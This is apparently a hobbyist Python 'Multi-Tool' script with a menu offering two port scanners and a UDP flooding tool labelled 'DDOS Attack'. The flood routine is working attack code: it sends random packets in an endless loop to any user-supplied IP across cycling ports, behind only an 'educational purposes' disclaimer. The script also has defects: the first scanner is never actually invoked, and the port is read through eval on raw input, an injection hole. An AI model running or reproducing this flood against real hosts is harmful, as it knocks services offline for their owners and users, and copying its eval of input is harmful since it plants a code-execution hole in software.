import os
import time
import socket
import scapy.all as scapy
import random
import pyfiglet
from colorama import Fore, Style, init
from datetime import datetime

# Initialize colorama
init()

# Add ASCII art or any necessary information
print("Welcome to the Multi-Tool!")
print("Developed by iamgeo1")

# Make a variable which is in the format opt(number) = -1 if needed
opt0 = -1
opt1 = -1
opt2 = -1

# Define your programs
def program0():
    # Port Scanner Program

    print("Made by iamgeo1")

    # Create a banner
    banner = pyfiglet.figlet_format("Port Scanner")

    # ANSI escape code for blue text
    blue_text = "\033[34m"

    # ANSI escape code to reset text formatting
    reset_text = "\033[0m"

    # Print the banner in blue
    print(blue_text + banner + reset_text)

    # Get the target IP and port range from the user
    target_ip = input("Target IP: ")
    start_port = int(input("Start Port: "))
    end_port = int(input("End Port: "))

    def port_scanner(ip, start_port, end_port):
        print(f"Scanning IP: {ip} from port {start_port} to {end_port}...\n")

        # Track the start time
        start_time = datetime.now()

        for port in range(start_port, end_port + 1):
            try:
                # Create a new socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # Set a timeout for the connection attempt
                sock.settimeout(1)
                # Attempt to connect to the target IP and port
                result = sock.connect_ex((ip, port))
                # If the result is 0, the port is open
                if result == 0:
                    print(f"Port {port}: OPEN")
                # Close the socket
                sock.close()
            except Exception as e:
                print(f"Error scanning port {port}: {e}")
                continue

        # Track the end time and calculate duration
        end_time = datetime.now()
        total_time = end_time - start_time
        print(f"\nScanning completed in: {total_time}")

def program1():
    # DDOS Attack Program

    def display_banner():
        banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
        banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
        banner += "██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝\n"
        banner += "██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗\n"
        banner += "██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\n"
        banner += "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n"
        print(banner)

    display_banner()

    # Terminal header settings and information
    os.system('color 0A')
    print("Developer  :       iamgeo1")
    print("Created Date:   2024-07-09")
    print('Project     :   DDOS-Attack')
    print('Purpose     :   A simple DDOS-Attack tool to test your network security')
    print('Caution     :   This tool is only for educational purposes. Do not use this for illegal purposes.')
    print()

    # Date and Time Declaration and Initialization
    mydate = time.strftime('%Y-%m-%d')
    mytime = time.strftime('%H-%M')

    # Lets define sock and bytes for our attack
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    # Type your ip and port number (find IP address using nslookup or any online website)
    ip = input("IP Target : ")
    port = eval(input("Port       : "))

    # Lets start the attack
    print("Thank you for using the KARTHIK-LAL (DDOS-ATTACK-TOOL).")
    print("Starting the attack on ", ip, " at port ", port, "...")

    time.sleep(5)
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %s through port:%s" % (sent, ip, port))
        if port == 65534:
            port = 1

    # End of the script
    os.system("cls")
    input("Press Enter to exit...")

def program2():
    # Port Scanner with Colorama

    # Define ASCII art
    ascii_art =(""" ____   ___  ____ _____   ____   ____    _    _   _ _   
|  _ \ / _ \|  _ \_   _| / ___| / ___|  / \  | \ | | \ | | ____|  _ \ 
| |_) | | | | |_) || |   \___ \| |     / _ \ |  \| |  \| |  _| | |_) |
|  __/| |_| |  _ < | |    ___) | |___ / ___ \| |\  | |\  | |___|  _ < 
|_|    \___/|_| \_\|_|   |____/ \____/_/   \_\_| \_|_| \_|_____|_| \_\

""")

    # Print ASCII art in different colors
    print(Fore.CYAN + ascii_art + Style.RESET_ALL)  # Cyan text

    print(Fore.BLUE + "Made by iamgeo1")
    print(Fore.BLUE + "Only use this for security reasons")
    print(Fore.BLUE + "For any advice, add @geo1ge on snapchat.com")

    # Input the target IP address
    target_ip = input(Fore.RED + "Target IP:")
    # Input port range
    start_port = int(input(Fore.YELLOW + "Start Port:"))
    end_port = int(input(Fore.YELLOW + "End Port:"))

    def port_scanner(target_ip, start_port, end_port):

        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                print(f"Port {port} is open")
            else:
                print(f"Port {port} is closed")
            sock.close()

    port_scanner(target_ip, start_port, end_port)

def programchoices():
    validity = False
    while not validity:
        print("")
        print("[0] - Port Scanner")
        print("[1] - DDOS Attack")
        print("[2] - Advanced Port Scanner with Colorama")
        print("")

        optchoice = int(input("Choose an option: "))

        if optchoice == 0:
            validity = True
            program0()
            break
        elif optchoice == 1:
            validity = True
            program1()
            break
        elif optchoice == 2:
            validity = True
            program2()   
            break
        else:
            print("Choose a valid option!")
            optchoice = -1

# Start the program
programchoices()
